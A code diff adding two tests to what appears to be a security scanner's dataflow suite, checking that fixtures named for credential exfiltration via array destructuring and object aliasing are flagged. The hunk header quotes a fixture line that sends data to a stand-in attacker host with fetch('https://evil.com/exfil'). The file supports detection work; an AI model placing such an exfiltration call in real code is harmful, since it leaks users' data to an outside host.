@@ -695,6 +695,30 @@ fetch('https://evil.com/exfil', { body: h });`;
       assert(t, 'HOME should still trigger suspicious_dataflow (fingerprint detection)');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- v2.6.5: Array destructuring taint propagation ---
+
+  await asyncTest('DATAFLOW B9: array destructuring propagates taint', async () => {
+    const result = await runScanDirect(path.join(TESTS_DIR, 'dataflow'));
+    // The array-destructure-exfil.js fixture should produce at least a credential_read source
+    const threats = result.threats.filter(t =>
+      t.file && t.file.replace(/\\/g, '/').includes('array-destructure-exfil')
+    );
+    assert(threats.length > 0,
+      `array-destructure-exfil.js should produce threats, got ${threats.length}`);
+  });
+
+  // --- v2.6.5: Object property alias taint propagation ---
+
+  await asyncTest('DATAFLOW B8: object property alias taint tracking', async () => {
+    const result = await runScanDirect(path.join(TESTS_DIR, 'dataflow'));
+    // The object-alias-exfil.js fixture should produce credential_read threats
+    const threats = result.threats.filter(t =>
+      t.file && t.file.replace(/\\/g, '/').includes('object-alias-exfil')
+    );
+    assert(threats.length > 0,
+      `object-alias-exfil.js should produce threats, got ${threats.length}`);
+  });
 }
 
 module.exports = { runDataflowTests };
